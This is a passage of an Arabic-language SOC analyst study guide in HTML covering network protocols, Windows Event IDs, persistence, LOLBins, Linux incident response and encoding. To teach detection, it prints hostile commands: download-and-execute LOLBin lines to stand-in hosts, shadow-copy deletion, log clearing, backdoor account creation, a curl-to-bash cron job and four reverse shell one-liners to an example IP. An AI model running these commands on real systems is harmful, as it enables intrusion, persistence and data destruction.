+</table></div>
+<p><b>هجمات DNS:</b> Tunneling/Exfil، DGA (domains عشوائية)، Fast-flux، Cache poisoning، Typosquatting/Lookalike، Domain hijacking، DNS amplification.</p>
+
+<h3>HTTP — اللي لازم تعرفه للتحليل</h3>
+<div class="grid2">
+<div class="card"><h4>Methods</h4><ul>
+<li><b>GET</b> طلب بيانات (الـ parameters في الـ URL ← بتبان في اللوج)</li>
+<li><b>POST</b> إرسال بيانات (الـ body <u>مش</u> بيظهر في access log عادةً) — Login، Upload، Exfil</li>
+<li><b>PUT / DELETE</b> رفع/مسح resource — لو مفعّلين غلط = خطر</li>
+<li><b>HEAD / OPTIONS</b> استطلاع — كتير بيستخدموا في الـ Scanning</li>
+<li><b>CONNECT</b> عمل Tunnel عبر Proxy (HTTPS)</li></ul></div>
+<div class="card"><h4>Status Codes</h4><ul>
+<li><b>2xx</b> نجاح: <code class="i">200 OK</code>، <code class="i">201 Created</code>، <code class="i">204</code></li>
+<li><b>3xx</b> Redirect: <code class="i">301</code> دائم، <code class="i">302</code> مؤقت (بعد Login ناجح كتير!)، <code class="i">304</code> Not modified</li>
+<li><b>4xx</b> خطأ عميل: <code class="i">400</code>، <code class="i">401</code> unauth، <code class="i">403</code> forbidden، <code class="i">404</code> (كتير = Dir brute force)، <code class="i">405</code>، <code class="i">429</code> rate-limit</li>
+<li><b>5xx</b> خطأ سيرفر: <code class="i">500</code> (مع SQLi = الـ payload كسر الـ query!)، <code class="i">502</code>، <code class="i">503</code></li></ul></div>
+</div>
+<p><b>Headers مهمة:</b> <code class="i">Host</code>، <code class="i">User-Agent</code> (sqlmap/curl/python-requests/PowerShell = مريب)، <code class="i">Referer</code> (جاي منين؟)، <code class="i">Cookie</code>، <code class="i">X-Forwarded-For</code> (الـ IP الحقيقي ورا proxy/LB)، <code class="i">Content-Type</code>، <code class="i">Authorization</code>.</p>
+
+<h3>TLS / HTTPS باختصار</h3>
+<p>Client Hello (فيه الـ <b>SNI</b> = اسم الدومين بيظهر cleartext) ← Server Hello + Certificate ← Key exchange ← Encrypted traffic. <b>فايدة للـ SOC:</b> حتى لو مش شايف المحتوى تقدر تشوف: SNI، الـ Certificate (self-signed؟ Let's Encrypt جديد؟)، <b>JA3/JA4 fingerprint</b> للعميل (Cobalt Strike مثلاً ليه fingerprints معروفة).</p>
+
+<h3>بروتوكولات تانية سريعة</h3>
+<ul>
+<li><b>ARP:</b> IP ← MAC داخل الـ LAN. ARP Spoofing = MITM (لو شفت MAC واحد لـ IPs كتير أو gateway MAC اتغير).</li>
+<li><b>DHCP (DORA):</b> Discover → Offer → Request → Acknowledge. مفيد لربط IP بـ Hostname في وقت معيّن!</li>
+<li><b>NAT/PAT:</b> IPs داخلية كتير تطلع بـ Public IP واحد ← عشان كده لازم Firewall/NAT logs عشان تعرف مين الجهاز الحقيقي.</li>
+<li><b>ICMP:</b> ping (Type 8 request / 0 reply)، Type 3 unreachable. Payload كبير/غريب = ICMP tunneling.</li>
+<li><b>VLAN / Segmentation:</b> بيقلل الـ Lateral movement.</li>
+<li><b>Forward Proxy</b> (بيحمي الـ users وهم طالعين للإنترنت) vs <b>Reverse Proxy</b> (قدام السيرفرات: Load balancing، WAF).</li>
+</ul>
+
+<h3>أجهزة الأمن وشغلانة كل واحد</h3>
+<div class="tbl"><table>
+<tr><th>الأداة</th><th>بتعمل إيه</th><th>بتدّيك Logs إيه</th></tr>
+<tr><td><b>Firewall</b> (Stateful / NGFW)</td><td>Allow/Deny حسب IP/Port/App/User. الـ NGFW فيه App-ID و IPS و URL filtering</td><td>src/dst/port/action/bytes/rule</td></tr>
+<tr><td><b>IDS</b> vs <b>IPS</b></td><td>IDS بيكتشف وينبّه (passive، out-of-band). IPS بيمنع (inline). Signature-based vs Anomaly-based</td><td>Signature name، SID، severity (Snort/Suricata)</td></tr>
+<tr><td><b>WAF</b></td><td>بيحمي الـ Web apps (L7): SQLi, XSS…</td><td>Rule ID، payload، action</td></tr>
+<tr><td><b>Proxy / SWG</b></td><td>بيفلتر ترافيك الـ Web الخارج، Categories، SSL inspection</td><td>URL، user، category، UA، bytes</td></tr>
+<tr><td><b>EDR / XDR</b></td><td>مراقبة الـ Endpoints: processes، files، registry، network + Response (isolate/kill)</td><td>Process trees، command lines، hashes</td></tr>
+<tr><td><b>SIEM</b></td><td>تجميع وربط (Correlation) الـ logs من كل حاجة + Alerts (Splunk, Sentinel, QRadar, Elastic, Wazuh)</td><td>—</td></tr>
+<tr><td><b>SOAR</b></td><td>Automation للـ Response بـ Playbooks (enrich, block, ticket)</td><td>—</td></tr>
+<tr><td><b>Email Gateway</b></td><td>فلترة Spam/Phishing، Sandboxing للـ attachments، URL rewriting</td><td>Sender، verdict، attachments</td></tr>
+<tr><td><b>DLP</b></td><td>منع تسريب البيانات الحساسة</td><td>Policy violations</td></tr>
+<tr><td><b>Sandbox</b></td><td>تشغيل ملف مشبوه في بيئة معزولة وتشوف سلوكه (any.run, Joe, Hybrid Analysis)</td><td>Behavior report</td></tr>
+<tr><td><b>Honeypot</b></td><td>فخ لجذب المهاجمين ودراسة أسلوبهم</td><td>أي تفاعل معاه = مشبوه</td></tr>
+</table></div>
+
+<h3>Wireshark Filters اللي هتحتاجها</h3>
+<pre><span class="c"># بالـ IP / Port</span>
+ip.addr == 10.10.5.23            ip.src == 10.10.5.23 &amp;&amp; tcp.port == 443
+<span class="c"># SYN scan: SYN من غير ACK</span>
+tcp.flags.syn == 1 &amp;&amp; tcp.flags.ack == 0
+<span class="c"># HTTP</span>
+http.request.method == "POST"     http.request.uri contains "login"     http.user_agent contains "sqlmap"
+<span class="c"># DNS</span>
+dns.qry.name contains "evil"      dns.qry.type == 16  <span class="c"># TXT</span>
+<span class="c"># TLS SNI</span>
+tls.handshake.extensions_server_name contains "example"
+<span class="c"># SMB / Kerberos / ICMP</span>
+smb2   kerberos   icmp
+<span class="c"># Export objects: File → Export Objects → HTTP   |  Follow stream: Right click → Follow → TCP Stream</span></pre>
+</section>
+
+<!-- ===================== WINDOWS ===================== -->
+<section class="sec" id="win">
+<header><h2><span class="num">02</span>Windows — Internals, Event IDs, Persistence</h2><label class="donebox"><input type="checkbox">خلصته</label></header>
+
+<h3>مفاهيم أساسية</h3>
+<ul>
+<li><b>Process</b> برنامج شغال (ليه PID و Parent PID). <b>Service</b> process بيشتغل في الخلفية تحت <code class="i">services.exe</code>.</li>
+<li><b>Registry Hives:</b> <code class="i">HKLM</code> (الجهاز كله)، <code class="i">HKCU</code> (اليوزر الحالي)، <code class="i">HKU</code>، <code class="i">HKCR</code>، <code class="i">HKCC</code>.</li>
+<li><b>SAM</b>: hashes الحسابات المحلية. <b>NTDS.dit</b>: قاعدة بيانات الـ AD على الـ DC (كل hashes الدومين). <b>LSASS</b>: بيحتفظ بالـ credentials في الميموري ← الهدف رقم 1 للـ Mimikatz.</li>
+<li><b>Privileges:</b> SYSTEM > Administrator > User. <code class="i">SeDebugPrivilege</code> بتسمح بقراءة ميموري processes تانية (LSASS).</li>
+<li><b>UAC</b>: بيطلب تأكيد للصلاحيات العالية. <b>Integrity levels</b>: Low/Medium/High/System.</li>
+</ul>
+
+<h3>Normal Windows Processes — اعرف الطبيعي عشان تكشف الشاذ</h3>
+<div class="tbl"><table>
+<tr><th>Process</th><th>Parent الطبيعي</th><th>Path</th><th>العدد</th><th>علامات الشك</th></tr>
+<tr><td class="m">System (PID 4)</td><td>—</td><td>—</td><td>1</td><td>PID غير 4</td></tr>
+<tr><td class="m">smss.exe</td><td>System</td><td class="m">C:\Windows\System32</td><td>1 (+ مؤقت لكل session)</td><td></td></tr>
+<tr><td class="m">csrss.exe</td><td>smss.exe (بيخرج فيبان بدون parent)</td><td class="m">System32</td><td>2+</td><td>Path غلط</td></tr>
+<tr><td class="m">wininit.exe</td><td>smss.exe (orphan)</td><td class="m">System32</td><td>1</td><td></td></tr>
+<tr><td class="m">services.exe</td><td>wininit.exe</td><td class="m">System32</td><td>1</td><td>أكتر من واحد</td></tr>
+<tr><td class="m">lsass.exe</td><td><b>wininit.exe</b></td><td class="m">C:\Windows\System32\lsass.exe</td><td><b>1 فقط</b></td><td>أكتر من نسخة، parent غلط، اسم شبيه <code class="i">lsas.exe</code> / <code class="i">lsasss.exe</code></td></tr>
+<tr><td class="m">svchost.exe</td><td><b>services.exe</b></td><td class="m">System32</td><td>كتير</td><td>Parent مش services.exe، مفيش <code class="i">-k</code>، اسم <code class="i">scvhost.exe</code>، path في Temp</td></tr>
+<tr><td class="m">winlogon.exe</td><td>smss.exe (orphan)</td><td class="m">System32</td><td>1 لكل session</td><td>Shell/Userinit registry متغير</td></tr>
+<tr><td class="m">explorer.exe</td><td>userinit.exe (بيخرج) ← بيبان بدون parent</td><td class="m">C:\Windows</td><td>1 لكل user</td><td>في System32 أو parent غريب</td></tr>
+<tr><td class="m">taskhostw.exe</td><td>svchost.exe</td><td class="m">System32</td><td>كتير</td><td></td></tr>
+</table></div>
+
+<h3>Parent → Child مريبين (EDR gold)</h3>
+<pre><span class="r">winword.exe / excel.exe / outlook.exe</span>  →  cmd.exe | powershell.exe | wscript.exe | mshta.exe | rundll32.exe   <span class="c"># Macro / exploit</span>
+<span class="r">w3wp.exe / httpd / nginx / tomcat (java)</span> →  cmd.exe | powershell.exe | whoami | sh               <span class="c"># Web shell!</span>
+<span class="r">wmiprvse.exe</span>                            →  powershell.exe / cmd.exe                              <span class="c"># WMI lateral movement</span>
+<span class="r">services.exe</span>                            →  cmd.exe /c ... | PSEXESVC.exe                        <span class="c"># PsExec / malicious service</span>
+<span class="r">explorer.exe</span>                            →  rundll32.exe بدون arguments / mshta http://...        <span class="c"># LNK / user execution</span>
+<span class="r">sqlservr.exe</span>                            →  cmd.exe                                              <span class="c"># xp_cmdshell</span></pre>
+
+<h3>أهم Windows Security Event IDs</h3>
+<div class="tbl"><table>
+<tr><th>Event ID</th><th>المعنى</th><th>بنستخدمه في إيه</th></tr>
+<tr><td class="m">4624</td><td>Successful logon</td><td>مين دخل منين (شوف Logon Type + Source IP)</td></tr>
+<tr><td class="m">4625</td><td>Failed logon</td><td>Brute force / Spraying (شوف Status/Sub Status)</td></tr>
+<tr><td class="m">4634 / 4647</td><td>Logoff / User initiated logoff</td><td>مدة الجلسة</td></tr>
+<tr><td class="m">4648</td><td>Logon using explicit credentials</td><td>RunAs، Lateral movement</td></tr>
+<tr><td class="m">4672</td><td>Special privileges assigned (Admin logon)</td><td>Admin دخل — مهم بعد 4624</td></tr>
+<tr><td class="m">4688</td><td>Process created (محتاج تفعيل command line auditing)</td><td>إيه اللي اتشغل</td></tr>
+<tr><td class="m">4697 / <b>7045</b></td><td>Service installed (Security / <b>System</b> log)</td><td>PsExec، Persistence، Malware</td></tr>
+<tr><td class="m">4698 / 4702 / 4699</td><td>Scheduled task created / updated / deleted</td><td>Persistence</td></tr>
+<tr><td class="m">4720</td><td>User account created</td><td>Backdoor account</td></tr>
+<tr><td class="m">4722 / 4725 / 4726</td><td>Account enabled / disabled / deleted</td><td></td></tr>
+<tr><td class="m">4723 / 4724</td><td>Password change attempt / <b>reset</b> by another account</td><td>Account takeover</td></tr>
+<tr><td class="m">4728 / 4732 / 4756</td><td>Member added to Global / <b>Local</b> / Universal security group</td><td>Privilege escalation (Domain Admins / Administrators)</td></tr>
+<tr><td class="m">4738</td><td>User account changed</td><td></td></tr>
+<tr><td class="m">4740</td><td>Account locked out</td><td>نتيجة Brute force</td></tr>
+<tr><td class="m">4768</td><td>Kerberos TGT requested (AS-REQ)</td><td>AS-REP roasting (Pre-auth type 0)</td></tr>
+<tr><td class="m">4769</td><td>Kerberos service ticket requested (TGS)</td><td><b>Kerberoasting</b> (Encryption 0x17 = RC4)</td></tr>
+<tr><td class="m">4771</td><td>Kerberos pre-auth failed</td><td>Brute force على Kerberos</td></tr>
+<tr><td class="m">4776</td><td>NTLM credential validation</td><td>NTLM brute force / Pass-the-Hash</td></tr>
+<tr><td class="m">4662</td><td>Operation on AD object</td><td>DCSync (Replication GUIDs)</td></tr>
+<tr><td class="m">5140 / 5145</td><td>Network share accessed / detailed check</td><td>ADMIN$ / C$ = lateral movement</td></tr>
+<tr><td class="m">4657</td><td>Registry value modified</td><td>Run keys</td></tr>
+<tr><td class="m">4719</td><td>Audit policy changed</td><td>Defense evasion</td></tr>
+<tr><td class="m"><b>1102</b></td><td><b>Security log cleared</b></td><td>Anti-forensics — دايماً مريب</td></tr>
+<tr><td class="m">104</td><td>System log cleared (System log)</td><td></td></tr>
+<tr><td class="m">4104 / 4103</td><td>PowerShell Script Block / Module logging</td><td>بيكشف الكود بعد فك الـ obfuscation!</td></tr>
+<tr><td class="m">5156 / 5157</td><td>WFP connection allowed / blocked</td><td>Host firewall</td></tr>
+</table></div>
+
+<h3>Logon Types (مع 4624/4625)</h3>
+<div class="tbl"><table>
+<tr><th>Type</th><th>الاسم</th><th>مثال</th></tr>
+<tr><td class="m">2</td><td>Interactive</td><td>دخول من الكيبورد قدام الجهاز</td></tr>
+<tr><td class="m">3</td><td>Network</td><td>SMB share، net use، PsExec (الجزء الأول) — <b>الأشهر في Brute force على SMB</b></td></tr>
+<tr><td class="m">4</td><td>Batch</td><td>Scheduled task</td></tr>
+<tr><td class="m">5</td><td>Service</td><td>Service بيشتغل بحساب</td></tr>
+<tr><td class="m">7</td><td>Unlock</td><td>فتح شاشة مقفولة</td></tr>
+<tr><td class="m">8</td><td>NetworkCleartext</td><td>Basic auth / IIS — الباسورد اتبعت cleartext</td></tr>
+<tr><td class="m">9</td><td>NewCredentials</td><td><code class="i">runas /netonly</code> — و <b>Pass-the-Hash بـ Mimikatz</b> (Logon process: seclogo)</td></tr>
+<tr><td class="m">10</td><td>RemoteInteractive</td><td><b>RDP</b></td></tr>
+<tr><td class="m">11</td><td>CachedInteractive</td><td>Domain user دخل والـ DC مش متاح</td></tr>
+</table></div>
+
+<h3>4625 Status / Sub-Status Codes</h3>
+<div class="tbl"><table>
+<tr><th>Code</th><th>المعنى</th><th>التحليل</th></tr>
+<tr><td class="m">0xC000006D</td><td>Bad username or password (عام)</td><td>شوف الـ Sub Status</td></tr>
+<tr><td class="m">0xC000006A</td><td>Username صح، Password غلط</td><td>الهاكر عارف اسم يوزر حقيقي!</td></tr>
+<tr><td class="m">0xC0000064</td><td>Username مش موجود</td><td>Enumeration / Spraying بأسامي عشوائية</td></tr>
+<tr><td class="m">0xC0000234</td><td>Account locked out</td><td></td></tr>
+<tr><td class="m">0xC0000072</td><td>Account disabled</td><td>حد بيحاول بحساب موظف ساب الشركة</td></tr>
+<tr><td class="m">0xC0000071 / 0xC0000193</td><td>Password expired / Account expired</td><td></td></tr>
+<tr><td class="m">0xC000006F / 0xC0000070</td><td>خارج ساعات الدخول / Workstation مش مسموح</td><td></td></tr>
+<tr><td class="m">0xC0000224</td><td>لازم يغير الباسورد</td><td></td></tr>
+</table></div>
+
+<h3>Sysmon Event IDs</h3>
+<div class="tbl"><table>
+<tr><th>ID</th><th>Event</th><th>ID</th><th>Event</th></tr>
+<tr><td class="m">1</td><td><b>Process Create</b> (مع hash + command line + parent)</td><td class="m">11</td><td>File Create</td></tr>
+<tr><td class="m">3</td><td><b>Network Connection</b></td><td class="m">12 / 13 / 14</td><td>Registry create-delete / <b>value set</b> / rename</td></tr>
+<tr><td class="m">5</td><td>Process Terminated</td><td class="m">15</td><td>FileCreateStreamHash (ADS / Mark-of-the-Web)</td></tr>
+<tr><td class="m">6</td><td>Driver Loaded</td><td class="m">17 / 18</td><td>Named Pipe created / connected (Cobalt Strike!)</td></tr>
+<tr><td class="m">7</td><td>Image (DLL) Loaded</td><td class="m">19-21</td><td>WMI Event filter / consumer / binding (Persistence)</td></tr>
+<tr><td class="m">8</td><td><b>CreateRemoteThread</b> (Injection)</td><td class="m">22</td><td><b>DNS Query</b></td></tr>
+<tr><td class="m">10</td><td><b>Process Access</b> (مين فتح lsass.exe؟)</td><td class="m">23 / 26</td><td>File Delete (archived / detected)</td></tr>
+</table></div>
+
+<h3>Persistence Locations (أماكن الاستمرار)</h3>
+<pre><span class="c"># Registry Run Keys (T1547.001)</span>
+HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
+HKLM\Software\Microsoft\Windows\CurrentVersion\Run
+HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
+<span class="c"># Winlogon (Userinit / Shell المفروض: userinit.exe, / explorer.exe)</span>
+HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon
+<span class="c"># Services (T1543.003)</span>
+HKLM\SYSTEM\CurrentControlSet\Services\
+<span class="c"># Image File Execution Options (Debugger hijack — مثلاً sethc.exe → cmd.exe "Sticky keys backdoor")</span>
+HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\
+<span class="c"># Startup Folder</span>
+%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
+C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
+<span class="c"># Scheduled Tasks (T1053.005) → C:\Windows\System32\Tasks\   | WMI Event Subscriptions (T1546.003) | New accounts (T1136)</span></pre>
+
+<h3>LOLBins — أدوات ويندوز الشرعية اللي الهاكرز بيستغلوها</h3>
+<div class="tbl"><table>
+<tr><th>Binary</th><th>استخدام خبيث (مثال)</th><th>MITRE</th></tr>
+<tr><td class="m">powershell.exe</td><td class="m">powershell -nop -w hidden -enc &lt;base64&gt;</td><td class="m">T1059.001</td></tr>
+<tr><td class="m">certutil.exe</td><td class="m">certutil -urlcache -split -f http://x/a.exe a.exe  |  certutil -decode</td><td class="m">T1105 / T1140</td></tr>
+<tr><td class="m">mshta.exe</td><td class="m">mshta http://x/payload.hta  |  mshta vbscript:...</td><td class="m">T1218.005</td></tr>
+<tr><td class="m">rundll32.exe</td><td class="m">rundll32 C:\Users\Public\x.dll,Start  |  comsvcs.dll,MiniDump (lsass)</td><td class="m">T1218.011</td></tr>
+<tr><td class="m">regsvr32.exe</td><td class="m">regsvr32 /s /n /u /i:http://x/a.sct scrobj.dll  ("Squiblydoo")</td><td class="m">T1218.010</td></tr>
+<tr><td class="m">bitsadmin.exe</td><td class="m">bitsadmin /transfer j /download http://x/a.exe C:\Temp\a.exe</td><td class="m">T1197</td></tr>
+<tr><td class="m">wmic.exe</td><td class="m">wmic /node:10.0.0.5 process call create "cmd /c ..."</td><td class="m">T1047</td></tr>
+<tr><td class="m">schtasks.exe</td><td class="m">schtasks /create /tn Updater /tr C:\Users\Public\u.exe /sc onlogon</td><td class="m">T1053.005</td></tr>
+<tr><td class="m">vssadmin.exe</td><td class="m">vssadmin delete shadows /all /quiet   <span class="c">← Ransomware!</span></td><td class="m">T1490</td></tr>
+<tr><td class="m">wbadmin / bcdedit</td><td class="m">wbadmin delete catalog -quiet | bcdedit /set {default} recoveryenabled no</td><td class="m">T1490</td></tr>
+<tr><td class="m">wevtutil.exe</td><td class="m">wevtutil cl Security</td><td class="m">T1070.001</td></tr>
+<tr><td class="m">net.exe</td><td class="m">net user hacker P@ss /add &amp;&amp; net localgroup administrators hacker /add</td><td class="m">T1136 / T1098</td></tr>
+<tr><td class="m">reg.exe</td><td class="m">reg save HKLM\SAM sam.save | reg add ...\Run /v x /d ...</td><td class="m">T1003.002</td></tr>
+<tr><td class="m">nltest / whoami / ipconfig / systeminfo</td><td class="m">nltest /domain_trusts | whoami /all</td><td class="m">Discovery T1482/T1033/T1082</td></tr>
+</table></div>
+
+<h3>Forensic Artifacts سريعة</h3>
+<ul>
+<li><b>Prefetch</b> <code class="i">C:\Windows\Prefetch\*.pf</code> ← البرنامج اتشغل امتى وكام مرة.</li>
+<li><b>Amcache / ShimCache</b> ← دليل إن ملف exe كان موجود/اتشغل.</li>
+<li><b>$MFT / USN Journal</b> ← timeline للملفات. <b>LNK / Jump lists</b> ← ملفات اتفتحت.</li>
+<li><b>Browser history</b>، <b>Recycle Bin</b>، <b>Zone.Identifier ADS</b> (Mark-of-the-Web: الملف نزل من النت منين).</li>
+<li>أماكن الـ Malware المفضلة: <code class="i">%TEMP%</code>، <code class="i">%APPDATA%</code>، <code class="i">C:\Users\Public</code>، <code class="i">C:\ProgramData</code>، <code class="i">C:\Windows\Temp</code>.</li>
+</ul>
+
+<h3>أوامر Windows للـ Triage</h3>
+<pre>netstat -ano                       <span class="c"># الاتصالات + PID</span>
+tasklist /svc   |  tasklist /v     <span class="c"># العمليات</span>
+wmic process get name,processid,parentprocessid,commandline
+Get-Process | Sort CPU -desc       |  Get-CimInstance Win32_Process | select Name,ProcessId,ParentProcessId,CommandLine
+net user  |  net localgroup administrators  |  query user
+schtasks /query /fo LIST /v        |  Get-ScheduledTask
+reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4625} -MaxEvents 50
+Get-FileHash .\file.exe -Algorithm SHA256       |  certutil -hashfile file.exe SHA256
+ipconfig /displaydns               <span class="c"># DNS cache</span></pre>
+</section>
+
+<!-- ===================== LINUX ===================== -->
+<section class="sec" id="linux">
+<header><h2><span class="num">03</span>Linux للـ SOC Analyst</h2><label class="donebox"><input type="checkbox">خلصته</label></header>
+
+<div class="grid2">
+<div class="card"><h4>📁 مجلدات مهمة</h4><ul>
+<li><code class="i">/etc</code> الإعدادات — <code class="i">/etc/passwd</code>، <code class="i">/etc/shadow</code>، <code class="i">/etc/sudoers</code>، <code class="i">/etc/crontab</code></li>
+<li><code class="i">/var/log</code> اللوجز</li>
+<li><code class="i">/tmp</code> و <code class="i">/dev/shm</code> و <code class="i">/var/tmp</code> ← writable للكل = مكان مفضل للـ Malware</li>
+<li><code class="i">/home/&lt;user&gt;</code> و <code class="i">/root</code> — <code class="i">.bash_history</code>، <code class="i">.ssh/authorized_keys</code></li>
+<li><code class="i">/var/www/html</code> ملفات الويب ← Web shells</li>
+<li><code class="i">/proc/&lt;PID&gt;</code> معلومات الـ processes الحية (cmdline، exe)</li></ul></div>
+<div class="card"><h4>📜 ملفات اللوج</h4>
+<div class="tbl"><table>
+<tr><td class="m">/var/log/auth.log</td><td>SSH، sudo، su (Debian/Ubuntu)</td></tr>
+<tr><td class="m">/var/log/secure</td><td>نفس الكلام (RHEL/CentOS)</td></tr>
+<tr><td class="m">/var/log/syslog | messages</td><td>System عام</td></tr>
+<tr><td class="m">/var/log/apache2/access.log</td><td>Web requests (nginx: /var/log/nginx/)</td></tr>
+<tr><td class="m">/var/log/audit/audit.log</td><td>auditd — execve etc.</td></tr>
+<tr><td class="m">/var/log/wtmp | btmp</td><td>دخول ناجح (<code class="i">last</code>) / فاشل (<code class="i">lastb</code>)</td></tr>
+<tr><td class="m">journalctl</td><td>systemd logs</td></tr>
+</table></div></div>
+</div>
+
+<h3>Users & Permissions</h3>
+<pre><span class="c"># /etc/passwd  →  username:x:UID:GID:comment:home:shell</span>
+root:x:<span class="r">0</span>:0:root:/root:/bin/bash
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+<span class="r">backup2:x:0:0::/home/backup2:/bin/bash</span>    <span class="c">← 🚩 UID 0 = root تاني (Backdoor)</span>
+
+<span class="c"># /etc/shadow  →  user:$id$salt$hash:...    $1$=MD5  $5$=SHA-256  $6$=SHA-512  $y$=yescrypt</span>
+
+<span class="c"># Permissions:  -rwxr-xr--  →  owner=rwx(7) group=r-x(5) others=r--(4)  = 754</span>
+<span class="c"># r=4 w=2 x=1   |  SUID=4000 (يشتغل بصلاحيات المالك)  SGID=2000  Sticky=1000 (/tmp)</span>
+find / -perm -4000 -type f 2&gt;/dev/null      <span class="c"># دوّر على SUID binaries (PrivEsc)</span></pre>
+
+<h3>أوامر Incident Response</h3>
+<pre>ps auxf                     <span class="c"># Process tree</span>
+ss -tulpn | netstat -tulpn  <span class="c"># Listening ports + process</span>
+ss -tanp state established  <span class="c"># الاتصالات القائمة</span>
+lsof -i :4444               <span class="c"># مين ماسك port</span>
+ls -la /proc/&lt;PID&gt;/exe      <span class="c"># الـ binary الحقيقي (لو "(deleted)" = مريب جداً)</span>
+last -a | lastb | who | w   <span class="c"># Logins</span>
+crontab -l ; ls -la /etc/cron.* /var/spool/cron/crontabs
+systemctl list-units --type=service --state=running
+find / -mtime -1 -type f 2&gt;/dev/null | grep -v /proc   <span class="c"># ملفات اتعدلت آخر 24 ساعة</span>
+cat ~/.bash_history ; cat ~/.ssh/authorized_keys
+sha256sum suspicious.bin</pre>
+
+<h3>Log Analysis One-liners (مهمة جداً للـ Assessment)</h3>
+<pre><span class="c"># أكتر IPs عملت Failed SSH</span>
+grep "Failed password" /var/log/auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -nr | head
+<span class="c"># مين نجح يدخل</span>
+grep "Accepted" /var/log/auth.log
+<span class="c"># أكتر IPs بتكلم الويب سيرفر</span>
+awk '{print $1}' access.log | sort | uniq -c | sort -nr | head
+<span class="c"># Status codes distribution</span>
+awk '{print $9}' access.log | sort | uniq -c | sort -nr
+<span class="c"># User-Agents</span>
+awk -F'"' '{print $6}' access.log | sort | uniq -c | sort -nr | head
+<span class="c"># دوّر على SQLi / Traversal</span>
+grep -Ei "union|select|sleep\(|%27|\.\./|etc/passwd|&lt;script" access.log</pre>
+
+<h3>شكل auth.log لهجوم SSH Brute Force</h3>
+<pre>Nov 20 03:12:01 web01 sshd[2211]: <span class="r">Failed password for invalid user admin</span> from 198.51.100.23 port 51122 ssh2
+Nov 20 03:12:03 web01 sshd[2213]: <span class="r">Failed password for root</span> from 198.51.100.23 port 51130 ssh2
+Nov 20 03:12:05 web01 sshd[2215]: Failed password for root from 198.51.100.23 port 51144 ssh2
+...  (× 340 محاولة)
+Nov 20 03:19:47 web01 sshd[2990]: <span class="hl">Accepted password for deploy from 198.51.100.23 port 52011 ssh2</span>
+Nov 20 03:19:47 web01 sshd[2990]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
+Nov 20 03:20:15 web01 sudo:   deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/wget http://198.51.100.23/x.sh</pre>
+<p><b>القراءة:</b> Brute force من IP واحد ← نجح على يوزر <code class="i">deploy</code> ← استخدم sudo ونزّل script = <span class="badge b-red">Compromised</span>. الخطوات: Isolate، اقفل اليوزر، Block IP، دوّر على persistence (cron, authorized_keys)، راجع x.sh.</p>
+
+<h3>Linux Persistence & Reverse Shells</h3>
+<div class="grid2">
+<div class="card"><h4>Persistence</h4><ul>
+<li>Cron jobs (<code class="i">* * * * * curl http://x/a.sh | bash</code>)</li>
+<li>SSH key في <code class="i">authorized_keys</code></li>
+<li>Systemd service جديد في <code class="i">/etc/systemd/system/</code></li>
+<li><code class="i">.bashrc</code> / <code class="i">.profile</code> / <code class="i">/etc/rc.local</code></li>
+<li>User بـ UID 0، تعديل sudoers</li>
+<li><code class="i">LD_PRELOAD</code> / <code class="i">/etc/ld.so.preload</code> (Rootkit)</li>
+<li>Web shell في <code class="i">/var/www</code></li></ul></div>
+<div class="card"><h4>Reverse Shells (اعرف شكلها)</h4>
+<pre>bash -i &gt;&amp; /dev/tcp/198.51.100.23/4444 0&gt;&amp;1
+nc -e /bin/sh 198.51.100.23 4444
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 198.51.100.23 4444 &gt;/tmp/f
+python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("198.51.100.23",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call(["/bin/sh","-i"])'</pre>
+<p><b>Reverse</b> = الضحية بتتصل بالمهاجم (بيعدي الـ Firewall الـ outbound). <b>Bind</b> = الضحية بتفتح port والمهاجم يتصل.</p></div>
+</div>
+</section>
+
+<!-- ===================== CODE ===================== -->
+<section class="sec" id="code">
+<header><h2><span class="num">04</span>قراءة الأكواد، الـ Encoding والـ Obfuscation</h2><label class="donebox"><input type="checkbox">خلصته</label></header>
+
+<p>مش مطلوب منك تبقى Developer — المطلوب إنك تبص على Script وتقول: <b>"ده بينزّل ملف من X، وبيشغله، وبيعمل Persistence عن طريق Y"</b>.</p>
+
+<h3>Encoding vs Encryption vs Hashing (سؤال إنترفيو أكيد)</h3>
+<div class="tbl"><table>
+<tr><th></th><th>Encoding</th><th>Encryption</th><th>Hashing</th></tr>
+<tr><td>الهدف</td><td>تغيير الشكل عشان النقل/التوافق</td><td>Confidentiality (سرية)</td><td>Integrity (سلامة البيانات)</td></tr>
+<tr><td>محتاج Key؟</td><td>لأ</td><td>أيوه (Symmetric/Asymmetric)</td><td>لأ</td></tr>
+<tr><td>Reversible؟</td><td>أيوه بسهولة</td><td>أيوه بالـ Key بس</td><td>لأ (One-way)</td></tr>
+<tr><td>أمثلة</td><td>Base64، URL، Hex، HTML entities</td><td>AES، RSA، ChaCha20</td><td>MD5 (32 hex)، SHA-1 (40)، SHA-256 (64)</td></tr>
+</table></div>
+
+<h3>إزاي تتعرف على الـ Encoding بعينك</h3>
+<div class="tbl"><table>
+<tr><th>النوع</th><th>شكله</th><th>مثال</th><th>بعد الفك</th></tr>
+<tr><td>Base64</td><td>A-Z a-z 0-9 + / وبينتهي غالباً بـ <code class="i">=</code> أو <code class="i">==</code>، الطول مضاعف 4</td><td class="m">YWRtaW46UGFzc3dvcmQxMjM=</td><td class="m">admin:Password123</td></tr>
+<tr><td>Base64 UTF-16LE (PowerShell -enc)</td><td>حرف <code class="i">A</code> كل حرفين تقريباً</td><td class="m">SQBFAFgA...  /  JABjAD0A...</td><td class="m">IEX ...  /  $c= ...</td></tr>
